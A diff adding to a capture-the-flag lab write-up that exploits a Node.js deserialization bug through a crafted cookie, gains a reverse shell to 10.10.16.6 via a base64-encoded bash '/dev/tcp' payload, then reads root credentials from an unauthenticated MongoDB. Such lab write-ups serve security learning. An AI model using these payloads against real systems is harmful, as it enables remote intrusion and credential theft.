@@ -81,3 +81,58 @@ Nmap done: 1 IP address (1 host up) scanned in 18.80 seconds
 ```
 {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
 ```
+- all the non-letters/digits in the cookie are URL encoded
+- there is a blog that explains the vulunerability
+```
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+```
+- The source code makes it clear that this is checked before the user or sign fields, so I can just make this my cookie. I’ll start with
+```
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.16.6', function(error, stdout, stderr){console.log(stdout)});}()"}
+```
+- and we url-encode it
+- I’ll start tcpdump, and send this in repeater, which leads to ICMP packets
+- The packets are received successfully, which means we can execute arbitrary code on the target machine
+- Having confirmed code execution, we now update our payload to obtain a reverse shell
+- simple Base64 encoded payload works in this case
+```
+echo 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1' | base64
+```
+- modified it to work on the url
+```
+echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi80NDMgIDA+JjEK|base64 -d|bash
+
+```
+- open netcat put the payload like this in the repeater and launch
+```
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNi80NDMgIDA+JjEK|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()"}
+```
+- and we got a shell
+- upgrade it using the script trick
+```
+1-script /dev/null -c bash
+2- ^Z
+3- stty raw -echo; fg
+```
+- successfully obtained a shell as admin
+- we do not have access to our home directory under /home/admin
+- since we own the directory we can change its permissions
+```
+1- chmod +x /home/admin
+2- cat /home/admin/user.txt
+```
+
+
+# Privilege Escalation
+- Enumerating the target system reveals MongoDB running on its default port
+- access the service on port 27017
+- show dbs
+- use blog
+- show collections
+- find two collections, the latter of which, namely users is of primary interest as it might contain
+credentials.
+- db.users.find()
+- we find root password
+- now change to sudo su and find root flag on root folder
+
+
